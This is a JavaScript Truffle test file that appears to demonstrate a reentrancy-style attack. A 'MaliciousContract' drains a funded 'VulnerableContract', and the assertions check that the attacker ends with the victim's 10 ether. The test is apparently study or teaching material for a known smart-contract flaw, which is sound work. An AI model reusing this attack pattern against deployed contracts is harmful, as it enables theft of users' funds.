const VulnerableContract = artifacts.require('VulnerableContract')
const MaliciousContract = artifacts.require('MaliciousContract')

contract('VulnerableContract', accounts => {

  const attacker = accounts[1]
  const bob = accounts[2]

  let vulnerableInstance
  let maliciousInstance

  before(async () => {
    vulnerableInstance = await VulnerableContract.deployed()
    maliciousInstance = await MaliciousContract.new(vulnerableInstance.address)
  })


  // it('should be able to deposit and withdraw', async () => {
  //   await maliciousInstance.deposit({ from: bob, value: web3.utils.toWei('1', 'ether') })
  //   await maliciousInstance.withdraw({ from: bob })
  // })

  it('should have all funds stolen', async () => {

    // const showBalance = async (contract, msg) => {
    //   const balance = await web3.eth.getBalance(contract.address)
    //   console.log(`Balance of ${msg} is ${web3.utils.fromWei(balance, 'ether')}`)
    // }

    const fundsToSend = web3.utils.toWei('10', 'ether')

    // fund the vulnerable contract
    await vulnerableInstance.send(fundsToSend, { from: accounts[4] })

    // deposit
    await maliciousInstance.deposit({ from: attacker, value: web3.utils.toWei('1', 'ether') })
    assert.equal(
      (await maliciousInstance.getBalance()).toString(),
      web3.utils.toWei('0', 'ether'),
      'malicious instance should have correct balance')

    // perform the attack
    await maliciousInstance.withdraw({ from: attacker })

    assert.equal(
      (await maliciousInstance.getBalance()).toString(),
      web3.utils.toWei('10', 'ether'),
      'malicious instance should have 10 ether')

    assert.equal(
      (await vulnerableInstance.getBalance()).toString(),
      web3.utils.toWei('1', 'ether'),
      'vulnerable instance should have 1 ether')
  })
})
